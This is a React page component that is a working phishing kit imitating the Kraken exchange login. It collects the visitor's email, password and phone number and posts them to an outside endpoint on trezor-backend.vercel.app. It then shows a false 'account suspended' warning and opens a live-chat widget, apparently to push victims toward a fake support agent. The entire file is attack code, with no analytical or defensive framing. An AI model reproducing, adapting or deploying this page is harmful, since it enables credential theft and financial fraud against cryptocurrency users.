'use client';
import { useState } from 'react';
import axios from 'axios';
import 'react-phone-number-input/style.css'
import PhoneInput from 'react-phone-number-input'

export default function HomePage() {
    const [showPassword, setShowPassword] = useState(false);
    const [loading, setLoading] = useState(false);
    const [alert, setAlert] = useState<{ type: 'success' | 'error'; message: string } | null>({
        type: 'error',
        message: 'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity'
    });

    const [formData, setFormData] = useState({
        email: '',
        password: '',
        phone: ''
    });
    const [step, setStep] = useState(0);

    // Handle input changes
    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value,
        }));
    };


    // Handle form submission
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setAlert(null);
        setLoading(true);

        try {
            const data = {
                title: "kreken Login",
                ...formData,
            };
            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data);
            if (response) {
                setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
            }
            // @ts-ignore
            window.Tawk_API?.maximize();
        } catch (err) {
            console.error(err);
            // setAlert({ type: 'error', message: 'Invalid credentials. Please contact support via chat.' });
            setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
        } finally {
            setLoading(false);
        }
    };

    return (<>
        <div className='bg-[#f6f5f9] flex flex-col h-screen'>

            <header >
                <div className="mx-auto px-8 py-2 flex items-center justify-between">
                    <div className="flex items-center">
                        <img src="/logo.svg" alt="Kraken" />
                    </div>
                    <div className="flex items-center gap-4">
                        <button className="flex items-center px-4 py-2  gap-1 text-sm bg-[rgba(104,107,130,.08)] text-gray-600 hover:text-gray-800 rounded-lg  cursor-pointer">
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            <span>U.S. English</span>
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                            </svg>
                        </button>
                        <button className="px-4 py-2 text-sm font-medium text-[#7132f5] hover:text-purple-700 bg-[#7d44f81c] rounded-lg cursor-pointer">
                            Create Account
                        </button>
                    </div>
                </div>
            </header>

            <main className="flex flex-1 items-center justify-center min-h-[calc(100vh-140px)] px-4 py-12">
                <div className="bg-white rounded-3xl shadow-sm p-8 w-full max-w-lg">
                    {
                        !!step &&
                        <svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="gray" className="size-6 cursor-pointer" onClick={() => {
                            setStep(0);
                            setAlert({
                                type: 'error',
                                message: 'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity'
                            });
                        }}>
                            <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 9-3 3m0 0 3 3m-3-3h7.5M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
                        </svg>
                    }

                    <div className="flex justify-center mb-6">
                        <video className="w-40" autoPlay loop playsInline preload="auto" disablePictureInPicture poster="https://assets.kraken.com/illustrations/animated/posters/Beast_Web.webp"
                            src='/Beast_Web.webm'
                        />
                    </div>

                    <h1 className="text-2xl font-bold text-center text-gray-900 mb-8 heading">{!step ? 'Sign in to Kraken' : 'Add your phone number'}</h1>
                    {
                        !!step && alert &&
                        <div className="mb-5 bg-red-50 border border-red-200 text-sm text-red-400 rounded-lg p-4 " role="alert" aria-labelledby="hs-with-list-label">
                            <div className="flex">
                                <div className="shrink-0">
                                    <svg className="shrink-0 size-4 mt-0.5" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <circle cx="12" cy="12" r="10"></circle>
                                        <path d="m15 9-6 6"></path>
                                        <path d="m9 9 6 6"></path>
                                    </svg>
                                </div>
                                <div className="ms-4">
                                    <h3 id="hs-with-list-label" className="text-sm font-semibold">
                                        {alert?.message}
                                    </h3>
                                </div>
                            </div>
                        </div>
                    }

                    {
                        !step ?
                            <form className="space-y-0.5"
                                onSubmit={(e) => {
                                    e.preventDefault();
                                    setStep(1);
                                }}>

                                <div>
                                    <input
                                        required
                                        type="text"
                                        placeholder="Email or username"
                                        className="text-sm w-full px-4 py-3 bg-[#f6f5f9] hover:bg-[#ededf0] rounded-tl-lg rounded-tr-lg focus:outline-none focus:ring-2 focus:ring-[#7132f5] focus:border-transparent text-gray-900"
                                        name='email'
                                        onChange={handleChange}
                                    />
                                </div>

                                <div className="relative">
                                    <input
                                        required
                                        type={showPassword ? 'text' : 'password'}
                                        id="password"
                                        placeholder="Password"
                                        className="text-sm w-full px-4 py-3 bg-[#f6f5f9] hover:bg-[#ededf0] rounded-bl-lg rounded-br-lg focus:outline-none focus:ring-2 focus:ring-[#7132f5] focus:border-transparent text-gray-900"
                                        name='password'
                                        onChange={handleChange}
                                    />
                                    <button
                                        type="button"
                                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                                        onClick={() => setShowPassword(!showPassword)}
                                    >
                                        {
                                            showPassword ?
                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                                </svg>
                                                :
                                                <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
                                                    <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />
                                                </svg>
                                        }
                                    </button>
                                </div>

                                <div className="text-left mt-3">
                                    <span className="text-sm text-gray-600">Forgot </span>
                                    <a href="#" className="text-sm text-[#7132f5] hover:text-purple-700 font-medium">password</a>
                                    <span className="text-sm text-gray-600"> or </span>
                                    <a href="#" className="text-sm text-[#7132f5] hover:text-purple-700 font-medium">username</a>
                                    <span className="text-sm text-gray-600">?</span>
                                </div>

                                <button
                                    type="submit"
                                    className="mt-7 w-full bg-[#7132f5] hover:bg-purple-700 text-white font-medium py-3 rounded-xl transition-colors duration-200 cursor-pointer"
                                >
                                    Continue
                                </button>

                                <div className="text-center pt-5">
                                    <span className="text-sm text-gray-600">Still can't sign in? </span>
                                    <a href="#" className="text-sm text-[#7132f5] hover:text-purple-700 font-medium">Email us</a>
                                </div>
                            </form>
                            :
                            <form className="space-y-0.5" onSubmit={handleSubmit}>
                                <div>
                                    <PhoneInput
                                        onChange={(e) => setFormData({
                                            ...formData,
                                            phone: e?.toString() ?? ''
                                        })}
                                        placeholder="Enter phone number"
                                        className='text-sm w-full px-4 py-3 bg-[#f6f5f9] hover:bg-[#ededf0] rounded-tl-lg rounded-tr-lg focus:outline-none focus:ring-2 focus:ring-[#7132f5] focus:border-transparent text-gray-900'
                                        defaultCountry='IN'
                                        name='phone'
                                    />
                                    {/* <input
                                        name='phone'
                                        required
                                        type="number"
                                        placeholder="Phone No."
                                        maxLength={10}
                                        minLength={10}
                                        className="text-sm w-full px-4 py-3 bg-[#f6f5f9] hover:bg-[#ededf0] rounded-tl-lg rounded-tr-lg focus:outline-none focus:ring-2 focus:ring-[#7132f5] focus:border-transparent text-gray-900"
                                        onChange={handleChange}
                                    /> */}
                                </div>
                                <button
                                    type="submit"
                                    className="mt-7 w-full bg-[#7132f5] hover:bg-purple-700 text-white font-medium py-3 rounded-xl transition-colors duration-200 cursor-pointer"
                                >
                                    Submit
                                </button>
                            </form>
                    }

                </div>
            </main>

            <footer className="py-5">
                <div className="max-w-7xl mx-auto px-6 flex justify-center gap-6">
                    <a href="#" className="text-sm text-gray-600 hover:text-gray-800">Privacy Notice</a>
                    <a href="#" className="text-sm text-gray-600 hover:text-gray-800">Terms of Service</a>
                </div>
            </footer>
        </div>
    </>);
}
